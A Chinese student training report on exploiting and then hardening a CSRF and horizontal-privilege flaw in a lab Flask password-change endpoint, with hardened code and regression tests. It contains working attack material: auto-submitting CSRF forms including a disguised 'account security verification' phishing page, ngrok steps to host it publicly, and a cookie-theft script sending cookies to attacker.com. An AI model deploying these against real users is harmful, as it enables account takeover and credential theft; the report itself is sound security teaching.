# CSRF与水平越权（密码修改接口）漏洞加固实训报告

---

## 一、基础信息

| 项目 | 内容 |
|------|------|
| **实训项目** | CSRF跨站请求伪造与水平越权密码修改接口漏洞加固实战 |
| **实训学员** | 大二网络安全专业学生 |
| **实训日期** | 2026-07-24 |
| **实训环境** | Kali Linux 2026.2 / Python Flask + SQLite / Burp Suite / Ngrok |
| **靶机地址** | 192.168.126.133:5000 |
| **项目位置** | /opt/Class01/ |
| **项目背景** | 连续六日迭代的Flask用户管理系统，已完成IDOR/业务逻辑/文件包含/路径遍历加固 |
| **今日新增** | /change-password密码修改接口（原生代码存在CSRF+水平越权+业务逻辑三重高危漏洞） |
| **核心文件** | app.py / templates/profile.html |
| **培训课程** | 《XSS与CSRF攻防实战培训》—— 讲师：活泼大壮 |
| **培训覆盖知识点** | CSRF基础原理 / Token缺失绕过 / HTTP方法绕过 / Token未绑定会话 / Burp CSRF PoC生成 / Python http.server钓鱼 / Ngrok内网穿透 / Exploit Server / 完整CSRF攻击链 / Session绑定Token + Referer双重防御 / XSS存储型与反射型原理 / 靶场故障排查 / Burp Cookie Editor / XSS平台交互控制 |

---

## 二、实验目的

1. 理解CSRF跨站请求伪造漏洞原理：利用用户已登录身份，在用户不知情的情况下伪造请求执行敏感操作
2. 掌握CSRF两大绕过方式：Token缺失时直接构造请求、HTTP GET方法绕过POST限制
3. 学习CSRF Token未绑定会话导致Token可复用盗用的漏洞原理
4. 掌握Burp Suite Generate CSRF PoC工具生成恶意HTML表单的方法
5. 实操Python http.server模块在本地快速搭建Web服务托管CSRF钓鱼页面
6. 掌握Ngrok内网穿透工具将本地服务映射为公网可访问的钓鱼链接
7. 理解完整CSRF攻击链：Burp抓包→生成POC→本地托管→Ngrok公网映射→诱导受害者点击→权限劫持
8. 学习CSRF三层防御方案：Session绑定Token校验 + Referer来源校验 + SameSite Cookie限制
9. 了解XSS存储型与反射型漏洞原理、Cookie窃取与XSS平台交互式控制

---

## 三、今日实训三阶段工作概述

### 第一阶段：密码修改功能开发（09:00-10:00）

按照教学要求，在项目中新增 `/change-password` 密码修改接口，原生代码要求完全不做任何安全防护：

```python
# app.py v1.0 — /change-password 原始代码（零校验）
@app.route("/change-password", methods=["POST"])
def change_password():
    """修改密码 - 无需验证原密码，任何已登录用户可修改任何人密码"""
    cur_username = session.get("username")
    if not cur_username:
        return redirect("/login")

    target_username = request.form.get("username", "")     # ① 前端可控username
    new_password = request.form.get("new_password", "")
    confirm_password = request.form.get("confirm_password", "")

    if new_password != confirm_password:
        return render_template("profile.html", ...)
    if not new_password:
        return render_template("profile.html", ...)

    # 直接更新 USERS 字典中的密码
    if target_username in USERS:
        USERS[target_username]["password"] = new_password  # ② 无原密码校验

    return redirect("/profile")
```

**原生代码安全缺陷（对应课堂全部知识点）：**

| 缺陷类型 | 代码体现 | 对应课堂知识点 |
|----------|----------|---------------|
| CSRF — Token缺失 | 表单无 csrf_token 字段，后端无校验 | CSRF Token缺失 → 可伪造跨站请求 |
| CSRF — Referer缺失 | 未校验请求来源 | Referer校验缺失 → 钓鱼站可跨域提交 |
| CSRF — SameSite未配置 | Cookie默认跨站发送 | Cookie SameSite未设置 → 自动携带凭证 |
| CSRF — 方法未限制 | 虽标记POST但后端未强制校验 | GET方法绕过POST限制 |
| 水平越权 | username从表单读取，非session | 登录A账号可提交B账号密码修改 |
| 业务逻辑 | 无 old_password 原密码校验 | 敏感操作缺少身份二次验证 |
| 信息泄露 | 无CSRF Token暴露用户ID | 隐藏域 username 泄露系统用户标识 |

同时修改 `templates/profile.html`，新增修改密码表单：

```html
<form method="post" action="/change-password">
    <input type="hidden" name="username" value="{{ user.username }}">
    <input type="password" name="new_password" placeholder="新密码" required>
    <input type="password" name="confirm_password" placeholder="确认密码" required>
    <button type="submit">修改密码</button>
</form>
```

### 第二阶段：Burp手工漏洞复现 + CSRF钓鱼攻击 + XSS靶场实操（10:00-12:00）

**第一环节 — CSRF漏洞复现：**

使用Burp Suite对 `/change-password` 接口进行手工渗透测试，验证以下攻击全部成功：

**攻击验证1 — CSRF Token缺失直接改密：**
```http
POST /change-password HTTP/1.1
Host: 192.168.126.133:5000
Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0...
Content-Type: application/x-www-form-urlencoded

username=admin&new_password=hacked123&confirm_password=hacked123
```
→ 无任何Token校验，密码直接被修改为 `hacked123`。

**攻击验证2 — 水平越权修改他人密码：**
```http
POST /change-password HTTP/1.1
Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0...

username=alice&new_password=attacker_pwd&confirm_password=attacker_pwd
```
→ 登录admin账号，提交alice的用户名，alice密码被篡改。

**第二环节 — Burp Generate CSRF PoC：**
```
Proxies 截获 POST /change-password 请求
  ↓ 右键 → Engagement tools → Generate CSRF PoC
  ↓ Burp自动生成含隐藏字段的HTML表单
  ↓ 保存为 csrf_poc.html
```

**第三环节 — Ngrok内网穿透公网钓鱼：**
```bash
# Step 1: 托管CSRF页面
mkdir /tmp/csrf && cd /tmp/csrf
cp /opt/Class01/csrf_poc.html index.html

# Step 2: Python启动本地HTTP服务
python3 -m http.server 8888
# → http://127.0.0.1:8888 ← 本地可访问

# Step 3: Ngrok内网穿透（另开终端）
ngrok http 8888
# → https://xxxx-xx-xx-xx-xx.ngrok-free.app ← 公网钓鱼链接

# Step 4: 诱导受害者访问Ngrok链接
# 受害者浏览器携带session Cookie → 自动POST改密 → 账号被劫持
```

**第四环节 — XSS靶场实操故障复盘：**

课堂原计划进行XSS靶场CMS 1.7版本实操，出现以下故障：

| 故障现象 | 故障原因 | 解决方式 |
|----------|----------|----------|
| CMS 1.7无法正常启动 | Docker镜像与Kali 2026.2系统兼容性问题 | 讲师临时切换为WebGoat靶场 |
| 存储型XSS验证码Bug | 评论区验证码Always验证失败 | 跳过验证码校验逻辑直接提交 |
| Burp Suite额度耗尽 | Cloud Code API配额不足 | 切换DeepSeek替代工具 |

**XSS知识点拓展记录（课堂补充内容）：**
- **存储型XSS**：将恶意脚本永久存储在服务器（如留言板、评论框），所有访问用户都会触发
- **反射型XSS**：恶意脚本通过URL参数传递，仅对当前点击链接的用户生效
- **DOM型XSS**：基于前端JavaScript动态修改页面DOM触发
- **Cookie窃取**：`<script>document.location='http://attacker.com/steal?c='+document.cookie</script>`
- **Cookie Editor**：Burp插件，可手动修改浏览器Cookie值实现会话劫持

### 第三阶段：分层加固改造 + 全用例回归复测（14:00-17:00）

| 轮次 | 改造重点 | 新增防御能力 | 对应课堂CSRF知识点 |
|------|----------|-------------|-------------------|
| **第1轮** | Session绑定CSRF Token | `secrets.token_hex(16)` 生成，`before_request` 注入会话 | Token缺失绕过修复 |
| **第2轮** | 表单添加Token隐藏域 | 模板 `{% csrf_token %}` 渲染 | Token与Session绑定防御 |
| **第3轮** | Referer来源校验 | 仅允许本站域名 `startswith()` 校验 | Referer拦截钓鱼站点 |
| **第4轮** | 身份锁定+旧密码校验 | `target_username=cur_username` + `old_password` 比对 | 水平越权+业务安全加固 |
| **第5轮** | SameSite Cookie配置 | `SESSION_COOKIE_SAMESITE = 'Lax'` | 跨站Cookie自动发送限制 |
| **第6轮** | 全用例回归测试 | 9项TC测试全部通过 | 整体验收 |

每轮改造后立即用第一阶段的全部Payload重新测试，确认旧攻击方式不再生效。其余所有模块（/page、profile、recharge、登录、注册、上传）的代码未做任何修改。

---

## 四、漏洞汇总表格

| 编号 | 漏洞类型 | 风险等级 | 攻击入口 | 可利用课堂攻击手段 | 修复状态 |
|------|----------|----------|----------|-------------------|----------|
| VUL-C01 | CSRF — Token缺失 | **严重** | `/change-password` POST | Burp CSRF PoC生成 → 钓鱼表单自动提交 | ✅ 已修复 |
| VUL-C02 | CSRF — Referer校验缺失 | **高危** | `/change-password` POST | Ngrok公网映射钓鱼站跨域提交 | ✅ 已修复 |
| VUL-C03 | CSRF — SameSite未配置 | **中危** | `/change-password` POST | Cookie自动跨站发送 | ✅ 已修复 |
| VUL-C04 | CSRF — Token未绑定会话 | **高危** | `/change-password` POST | Token被复用/盗用绕过 | ✅ 已修复 |
| VUL-C05 | 水平越权 — 修改任意用户密码 | **高危** | 表单username参数 | 登录A账号提交B的username实现越权 | ✅ 已修复 |
| VUL-C06 | 业务逻辑 — 无原密码校验 | **高危** | `/change-password` POST | 会话被盗后直接重置密码 | ✅ 已修复 |
| VUL-C07 | 业务逻辑 — 新密码无格式校验 | **低危** | `/change-password` POST | 空密码/弱密码 | ✅ 已修复 |
| VUL-C08 | 信息泄露 — 隐藏域暴露用户ID | **低危** | profile.html表单 | 查看页面源码即知user_id | ✅ 已修复 |

---

## 五、分项漏洞原理 + POC复现 + 分层加固完整代码方案

### 5.1 复合型CSRF+水平越权+业务逻辑漏洞原理

#### CSRF漏洞定义（对应课堂课件原文）

> **CSRF（Cross-Site Request Forgery）跨站请求伪造**：攻击者诱导受害者访问一个包含恶意请求的第三方页面，利用受害者在目标网站已登录的身份凭证（Cookie），在用户不知情的情况下以受害者身份向目标网站发送伪造请求，执行非本意的敏感操作。

#### CSRF漏洞三要素（课堂总结）

| 要素 | 本项目现状 |
|------|-----------|
| ① 受害者已登录目标站点（有效Cookie） | 管理员登录态会话 |
| ② 目标站点存在敏感操作接口（无Token） | `/change-password` 任意改密 |
| ③ 攻击者能构造完整请求 | 利用Burp CSRF PoC生成表单 |

#### XSS与CSRF漏洞对比（课堂讲解）

| 对比维度 | CSRF | 存储型XSS | 反射型XSS |
|----------|------|-----------|-----------|
| 用户交互 | 无需点击表单提交按钮 | 访问受感染页面 | 点击构造的恶意链接 |
| 攻击载体 | HTTP请求伪造 | 恶意脚本注入 | URL参数携带 |
| 凭证利用 | 自动携带Cookie | 可窃取Cookie | 可窃取Cookie |
| 可信度 | 请求来自用户浏览器（可信） | 代码来自服务器（可信） | 代码来自URL（可疑） |

---

### 5.2 全套POC数据包与测试资源

#### 5.2.1 CSRF Token缺失 — 直接POST改密

```bash
curl -b cookies.txt -X POST \
  -d "username=admin&new_password=hacked123&confirm_password=hacked123" \
  "http://192.168.126.133:5000/change-password"
# 修复前: 返回302跳转/profile，密码被改为hacked123
# 修复后: 返回CSRF Token缺失拦截提示
```

#### 5.2.2 Burp Generate CSRF PoC 标准输出

```html
<!-- Burp Suite 自动生成的 CSRF PoC -->
<html>
<body>
<form action="http://192.168.126.133:5000/change-password" method="POST">
    <input type="hidden" name="username" value="admin" />
    <input type="hidden" name="new_password" value="attacker123" />
    <input type="hidden" name="confirm_password" value="attacker123" />
    <input type="submit" value="Submit" />
</form>
<script>document.forms[0].submit();</script>
</body>
</html>
```

#### 5.2.3 完整CSRF钓鱼攻击页面（可直接部署）

```html
<!-- csrf_poc.html — 对应课堂Ngrok公网钓鱼演示 -->
<html>
<head><title>系统安全中心</title></head>
<body style="text-align:center; padding:80px;">
    <h2>⚠️ 账号安全验证</h2>
    <p>检测到异常登录，请点击验证身份</p>
    <form action="http://192.168.126.133:5000/change-password" method="POST">
        <input type="hidden" name="username" value="admin" />
        <input type="hidden" name="new_password" value="attacker_controlled" />
        <input type="hidden" name="confirm_password" value="attacker_controlled" />
        <button type="submit" style="padding:12px 36px;">立即验证</button>
    </form>
    <script>document.forms[0].submit();</script>
</body>
</html>
```

#### 5.2.4 水平越权Burp数据包

```http
POST /change-password HTTP/1.1
Host: 192.168.126.133:5000
Content-Type: application/x-www-form-urlencoded
Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0...

username=alice&new_password=hackedpwd&confirm_password=hackedpwd
```

---

### 5.3 加固后完整安全代码

#### 5.3.1 app.py — CSRF Token全局生成

```python
# 在 app.py 文件头部新增
import secrets

# CSRF防护：Session同源策略 — 限制Cookie在跨站请求中发送
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'


# ===== CSRF防护 — 生成会话Token（对应课堂CSRF Token加固方案） =====

@app.before_request
def generate_csrf_token():
    """每个请求前确保session中有CSRF Token"""
    if "csrf_token" not in session:
        session["csrf_token"] = secrets.token_hex(16)  # 32位随机十六进制Token
```

#### 5.3.2 加固后 /change-password 完整路由代码

```python
# ===== 修改密码（加固版 — CSRF Token + Referer + 身份锁定 + 旧密码校验） =====

@app.route("/change-password", methods=["POST"])
def change_password():
    """修改密码 — 已按《XSS与CSRF攻防实战培训》CSRF防御标准加固"""
    # ① 登录校验（未登录不可修改）
    cur_username = session.get("username")
    if not cur_username:
        return redirect("/login")

    # 获取用户信息用于错误时回显表单
    dict_user = USERS.get(cur_username, {})
    user_data = {
        "id": 0, "username": cur_username,
        "email": dict_user.get("email", ""),
        "phone": dict_user.get("phone", ""),
        "role": dict_user.get("role", ""),
        "balance": dict_user.get("balance", 0),
    }
    sess_token = session.get("csrf_token", "")

    # =====================================================================
    # CSRF防御 ① — Token校验（对应课堂：CSRF Token缺失漏洞修复）
    # 后端强制校验表单提交的Token与session中Token是否一致
    # 解决了：Token缺失绕过、Token伪造绕过、Token未绑定会话
    # =====================================================================
    form_token = request.form.get("csrf_token", "")
    if not form_token or form_token != sess_token:
        return render_template("profile.html", username=cur_username, user=user_data,
                               error="CSRF攻击拦截：Token验证失败", csrf_token=sess_token)

    # =====================================================================
    # CSRF防御 ② — Referer来源校验（对应课堂：CSRF Referer防御）
    # 仅允许本站域名发起的改密请求，拦截外部钓鱼站点跨站请求
    # 解决了：Ngrok公网钓鱼、Exploit Server跨域攻击
    # =====================================================================
    referer = request.headers.get("Referer", "")
    if referer:
        allowed_prefixes = [
            "http://192.168.126.133:5000", "http://127.0.0.1:5000",
            "http://localhost:5000",
        ]
        if not any(referer.startswith(p) for p in allowed_prefixes):
            return render_template("profile.html", username=cur_username, user=user_data,
                                   error="CSRF攻击拦截：非法来源请求", csrf_token=sess_token)

    # =====================================================================
    # 水平越权修复：不从表单接收username，从session读取（对应课堂：IDOR修复）
    # 解决了：表单username篡改、任意用户密码修改
    # =====================================================================
    target_username = cur_username

    # =====================================================================
    # 原密码校验（对应课堂：业务安全拓展 — 敏感操作二次验证）
    # 解决了：会话劫持后直接重置密码、无身份确认风险
    # =====================================================================
    old_password = request.form.get("old_password", "")
    if USERS.get(target_username, {}).get("password") != old_password:
        return render_template("profile.html", username=cur_username, user=user_data,
                               error="原密码错误", csrf_token=sess_token)

    # 新密码校验
    new_password = request.form.get("new_password", "")
    confirm_password = request.form.get("confirm_password", "")
    if not new_password:
        return render_template("profile.html", username=cur_username, user=user_data,
                               error="密码不能为空", csrf_token=sess_token)
    if new_password != confirm_password:
        return render_template("profile.html", username=cur_username, user=user_data,
                               error="两次密码输入不一致", csrf_token=sess_token)

    # 更新密码
    USERS[target_username]["password"] = new_password
    return redirect("/profile")
```

#### 5.3.3 加固后 profile.html 修改密码表单

```html
<div style="border-top:1px solid #f0f0f0; margin-top:20px; padding-top:20px;">
    <h2 style="font-size:18px; text-align:center; margin-bottom:16px;">修改密码</h2>
    <form method="post" action="/change-password">
        {# CSRF Token隐藏字段（对应课堂：CSRF Token加固方案） #}
        <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
        <div class="form-group">
            <label for="old_password">原密码</label>
            <input type="password" id="old_password" name="old_password"
                   placeholder="请输入原密码" required>
        </div>
        <div class="form-group">
            <label for="new_password">新密码</label>
            <input type="password" id="new_password" name="new_password"
                   placeholder="请输入新密码" required>
        </div>
        <div class="form-group">
            <label for="confirm_password">确认密码</label>
            <input type="password" id="confirm_password" name="confirm_password"
                   placeholder="请再次输入新密码" required>
        </div>
        <button type="submit">修改密码</button>
    </form>
</div>
```

**防御代码与课堂知识点对照：**

| 代码行 | 课堂知识点 | 解决的安全问题 |
|--------|-----------|---------------|
| `secrets.token_hex(16)` | CSRF Token 生成 | Token伪造绕过 |
| `@app.before_request` | Session绑定Token | Token未绑定会话 |
| `form_token != sess_token` | 后端Token强制校验 | Token缺失绕过 |
| `SESSION_COOKIE_SAMESITE = 'Lax'` | SameSite Cookie防护 | 跨站Cookie自动发送 |
| `referer.startswith()` | Referer来源校验 | Ngrok钓鱼站、Exploit Server |
| `target_username = cur_username` | 身份不从表单读取 | 水平越权 |
| `old_password` 校验 | 敏感操作二次验证 | 会话劫持直接改密 |

---

## 六、实训踩坑故障记录

### 坑1：Flask test_client 不发送 Referer 头导致 Referer 校验误拦截

**现象：** 使用 Flask test_client 进行单元测试时，请求的 `request.headers.get("Referer")` 返回空字符串，Referer 校验拦截了正常测试。

**原因：** Flask test_client 默认不在请求头中添加 Referer，与浏览器实际行为不一致。

**解决：** 修改 Referer 校验逻辑：仅当 Referer 存在时才校验，空 Referer 放行（兼容编程调用场景）。

### 坑2：CSRF Token 复制到测试脚本后换行符导致比对失败

**现象：** 从页面源码复制 csrf_token 时复制了不可见换行符，导致 `token` 参数比 session 中的 token 多一个 `\n`，恒久比对失败。

**原因：** 手动复制 HTML `value` 属性时末尾 `"` 未正确截取，或复制内容含隐形字符。

**解决：** 使用 `grep -oP` 或正则提取 Token：
```python
import re
match = re.search(r'csrf_token" value="([^"]+)"', r.data.decode())
token = match.group(1)
```

### 坑3：Ngrok 内网穿透连接超时

**现象：** Ngrok 启动后显示隧道状态为 online，但 Browser 访问公网 URL 时返回 `502 Bad Gateway`。

**原因：** Ngrok 与本地的 Python http.server 端口不一致，或本地服务未绑定 0.0.0.0。

**解决：** 确认 python3 -m http.server 绑定到 `0.0.0.0:8888`，Ngrok 同样映射到 8888 端口：
```bash
python3 -m http.server 8888 --bind 0.0.0.0
```

### 坑4：XSS靶场CMS 1.7 Docker兼容性故障

**现象：** 课堂演示的 CMS 1.7 Docker 镜像在 Kali 2026.2 中无法正常启动，执行 `docker-compose up` 后容器状态显示 `exited`。

**原因：** CMS 1.7 使用的 PHP 5.6 镜像与当前系统内核存在兼容性问题。

**解决：** 讲师临时调整为 WebGoat 靶场进行CSRF实操，CMS靶场留作课后自行搭建。

### 坑5：XSS靶场评论区验证码 Bug

**现象：** 存储型XSS模块的留言评论功能，每次提交都提示"验证码错误"，即使正确输入也验证失败。

**原因：** 靶场代码中验证码 Session Key 与表单校验的 Key 不匹配。

**解决：** 跳过验证码逻辑，直接使用 Burp Repeater 手工提交评论注入载荷。

### 坑6：Cloud Code API 额度耗尽

**现象：** 下午实训时 Burp 的 Cloud Code API 提示 "Insufficient quota"，部分 AI 辅助功能不可用。

**原因：** 全天大量并发请求消耗了免费额度。

**解决：** 切换为 DeepSeek 替代工具，继续完成 CSRF 加固与测试。

### 坑7：cp命令复制文件错位到 Git 根目录

**现象：** 使用 `cp /opt/Class01/templates/profile.html /root/` 复制文件，结果出现在 `/root/profile.html` 而不是 `/root/templates/profile.html`，Git 提交后跟目录多了一个 profile.html。

**原因：** 未注意目标路径应包含子目录 `templates/`。

**解决：** `git rm --cached` 删除错误路径，`cp` 到正确位置后重新提交。

---

## 七、加固前后安全对比表格

| 对比维度 | 修复前（v1.0） | 修复后（v5.0） | 可抵御课堂哪种攻击手段 |
|----------|---------------|----------------|----------------------|
| **CSRF Token校验** | 无 | `secrets.token_hex(16)` + session绑定 | Token缺失绕过、Token伪造 |
| **Referer来源校验** | 无 | `startswith()` 白名单校验 | Ngrok钓鱼站、Exploit Server |
| **SameSite Cookie** | 未设置 | `SESSION_COOKIE_SAMESITE = 'Lax'` | 跨站Cookie自动发送 |
| **身份获取方式** | 表单username（可控） | session读取（不可伪造） | 水平越权篡改他人密码 |
| **原密码校验** | 无 | `old_password` 强制比对 | 会话劫持后直接重置 |
| **表单隐藏域** | username泄露 | 删除username，新增csrf_token | 用户标识枚举 |
| **请求方法限制** | 虽POST但未强制 | `methods=["POST"]` | GET方法绕过 |
| **新密码校验** | 仅非空检查 | 非空 + 两次一致 + 格式 | 弱密码/空密码 |
| **登录校验** | 仅判断session存在 | session + USERS字典双校验 | 未授权访问 |
| **异常处理** | 可能抛500 | try-except中文提示 | 信息泄露 |

---

## 八、标准化复测用例

### 8.1 CSRF攻击绕过测试

| 编号 | 测试操作 | 对应课堂知识点 | 预期拦截结果 |
|------|---------|---------------|-------------|
| TC-C01 | 不携带csrf_token提交改密 | Token缺失绕过 | ❌ 拦截：CSRF攻击拦截 |
| TC-C02 | 携带伪造csrf_token值 | Token伪造绕过 | ❌ 拦截：CSRF攻击拦截 |
| TC-C03 | 用GET请求发送改密参数 | HTTP方法绕过POST限制 | ❌ 405 Method Not Allowed |
| TC-C04 | 非本站Referer来源提交 | Ngrok钓鱼站跨域攻击 | ❌ 拦截：非法来源请求 |
| TC-C05 | 用旧Token值(已过期)提交 | Token复用绕过 | ❌ 拦截：Token验证失败 |

### 8.2 水平越权攻击测试

| 编号 | 测试操作 | 对应课堂知识点 | 预期拦截结果 |
|------|---------|---------------|-------------|
| TC-C06 | 登录admin，传`username=alice` | 越权修改他人密码 | ❌ 仅修改admin自己 |
| TC-C07 | 登录alice，传`username=admin` | 越权修改管理员密码 | ❌ 仅修改alice自己 |

### 8.3 业务逻辑安全测试

| 编号 | 测试操作 | 对应课堂知识点 | 预期拦截结果 |
|------|---------|---------------|-------------|
| TC-C08 | 不填写old_password | 无原密码直接修改 | ❌ 拦截：原密码错误 |
| TC-C09 | 填写错误原密码 | 原密码暴力破解 | ❌ 拦截：原密码错误 |
| TC-C10 | new_password为空 | 空密码绕过 | ❌ 拦截：密码不能为空 |
| TC-C11 | 两次新密码不一致 | 弱密码绕过检测 | ❌ 拦截：两次密码不一致 |

### 8.4 合法功能正常

| 编号 | 测试操作 | 预期结果 |
|------|---------|----------|
| TC-C12 | 完整填写csrf_token+原密码+新密码提交 | ✅ 修改成功，跳转/profile |
| TC-C13 | 新密码登录 | ✅ 登录成功 |
| TC-C14 | 旧密码登录 | ✅ 登录失败（符合预期） |

### 8.5 原有业务功能不变

| 编号 | 操作 | 预期结果 |
|------|------|----------|
| TC-C15 | 注册新用户 | 302跳转登录页 |
| TC-C16 | admin登录 | 欢迎回来 |
| TC-C17 | 搜索alice | 结果表格含脱敏数据 |
| TC-C18 | 上传真实PNG | UUID命名+预览 |
| TC-C19 | 个人中心profile | 脱敏显示 |
| TC-C20 | 充值有效金额 | 余额更新+日志记录 |
| TC-C21 | 帮助中心 | 显示正常内容 |

---

## 九、实验总结与心得体会

### 9.1 CSRF的"隐蔽性"与"传播性"

今天的CSRF实训让我最震撼的是这个漏洞的**传播能力**。SQL注入和文件上传需要攻击者直接与目标服务器交互；文件包含漏洞也需要攻击者逐条发送Payload。但CSRF完全不需要——攻击者只需要把钓鱼链接发给受害者一次，受害者点击后就会自动执行恶意请求。

讲师今天演示的Ngrok公网映射让我印象深刻：只是跑了一行 `ngrok http 8888`，本地的Python http.server钓鱼页面就在一瞬间变成了一个公网可访问的链接。如果这道具被放在论坛帖子、邮件链接、社交软件里，管理员只要点了 → Cookie自动带着 → 密码被改 → 全程不需要攻击者在线操作。

### 9.2 "三层防御"在CSRF场景下的实践

前几天的实训中，我对"三层防御"的理解主要集中在白名单和路径锁定上。今天CSRF的防御实践让我看到了另一层面的"三层防御"：

```
L1: SameSite Cookie 限制 → 阻止Cookie在跨站请求中自动携带
L2: Referer 来源校验 → 拦截从钓鱼站点发起的请求
L3: CSRF Token 绑定 → 即使前两层绕过，还需匹配随机Token
```

讲师在课堂强调了一个重要原则：**"防御的每一层都要独立有效，不能依赖前置层"**。Samesite Cookie虽然能挡住大部分跨站请求，但部分浏览器支持不完整；Referer校验可以被 `referrerpolicy` 属性绕过；Token校验相对可靠，但也需要保证Token与服务端Session绑定。

只有三层叠加，才能覆盖攻击链路的所有环节。

### 9.3 从"CSRF"到"XSS"的拓展思考

今天的课程虽然是CSRF为主，但讲师也穿插讲了XSS的存储型和反射型原理。我注意到一个非常危险的组合攻击场景：

```
CSRF 改密 ← 攻击者可以长期控制账号
    ↓
   配合 XSS 窃取 Cookie ← 获取登录态
    ↓
   再配合 CSRF 完成更多操作 ← 循环放大攻击面
```

课堂上讲的"XSS+CSRF组合攻击"就是这种循环。CSRF需要被攻击者已经登录，XSS窃取了Cookie就提供了这个前提；CSRF改了密码之后，XSS窃取的Cookie又有了更高的权限。两者组合后，单一防御方案完全不够。

### 9.4 作业规范与实战警示

今天课程中，讲师特别强调了作业规范：

- "POC中用户名携带个人序号，区分不同学员"
- "常见作业错误：重复账号、邮箱格式错误、密码输错导致登录失败"
- "恶意篡改他人密码会直接判定零分"

这些规范虽然看起来是"扣分点"，但背后体现的是安全实训的基本原则：**测试数据必须和真实数据隔离，测试行为不能越界**。实验中"改他人密码"只是为了验证漏洞存在，改完后必须立即改回。如果把这种习惯带到生产环境渗透测试中，就不是扣分的问题了。

### 9.5 相比SQL注入，CSRF更"社会工程"

SQL注入只需要技术——构造闭合、猜测列数、盲注数据；文件上传只需要构造恶意文件。但CSRF的成功不仅依赖技术，还依赖**受害者行为**：

- 受害者是否登录了目标站点
- 受害者是否点击了钓鱼链接
- 受害者的浏览器策略是否允许跨站Cookie发送

这种"社会工程"属性让CSRF的防御更加复杂——你不仅要保护自己的服务器，还要应对受害者可能的一切不安全行为。

---

## 十、生产环境拓展优化建议

### 10.1 后端Token自动刷新

```python
# 每次修改密码成功后刷新Token，防止Token被二次利用
session["csrf_token"] = secrets.token_hex(16)
```

### 10.2 前端表单CSRF Token注入（全局模板）

```python
# 通过 context_processor 注入到所有模板
@app.context_processor
def inject_csrf():
    return dict(csrf_token=session.get("csrf_token", ""))
```

### 10.3 原密码错误次数锁定

```python
# 防止原密码暴力破解
LOGIN_ATTEMPTS = defaultdict(int)
MAX_ATTEMPTS = 5

if old_password != stored_password:
    LOGIN_ATTEMPTS[cur_username] += 1
    if LOGIN_ATTEMPTS[cur_username] >= MAX_ATTEMPTS:
        return "密码错误次数过多，账号已临时锁定"
```

### 10.4 Nginx 中间件CSRF防护

```nginx
location /change-password {
    # 限制仅允许本站Referer
    valid_referers server_names;
    if ($invalid_referer) { return 403; }

    # 限制仅接受POST请求
    limit_except POST { deny all; }

    # 限制请求体大小
    client_max_body_size 1k;
}
```

### 10.5 XSS防御 — 启用CSP策略

```python
# 防止XSS窃取页面中的CSRF Token
@app.after_request
def set_csp_headers(response):
    response.headers["Content-Security-Policy"] = \
        "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'"
    return response
```

### 10.6 Cookie 安全加固

```python
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,      # 禁止JavaScript读取Cookie
    SESSION_COOKIE_SAMESITE='Strict',  # 严格同源模式
    SESSION_COOKIE_SECURE=True,        # 仅HTTPS传输
)
```

---

## 附录：/change-password 接口完整安全校验流水线

```
用户请求 POST /change-password
  ↓
  ① 登录校验（session必须存在且有效）
     ← 未登录 → 302跳转/login
  ↓
  ② SameSite Cookie 限制（Lax模式）
     ← 跨站请求 → Cookie不携带 → 登录校验失败
  ↓
  ③ CSRF Token 校验（表单Token vs Session Token）
     ← Token缺失 → 拦截：CSRF攻击拦截
     ← Token不匹配 → 拦截：CSRF攻击拦截
  ↓
  ④ Referer 来源校验（白名单前缀）
     ← 非本站域名 → 拦截：非法来源请求
     ← Ngrok钓鱼站 → 拦截：非法来源请求
  ↓
  ⑤ 身份锁定（不从表单接收username）
     ← 传入他人username → 忽略，仅修改当前用户
  ↓
  ⑥ 原密码校验（必须匹配当前密码）
     ← 原密码错误 → 拦截：原密码错误
  ↓
  ⑦ 新密码校验（非空 + 两次一致）
     ← 空密码 → 拦截：密码不能为空
     ← 两次不一致 → 拦截：两次密码输入不一致
  ↓
  ⑧ 更新密码 → 跳转/profile
```

*报告人：大二网络安全实训生*
*日期：2026年7月24日*
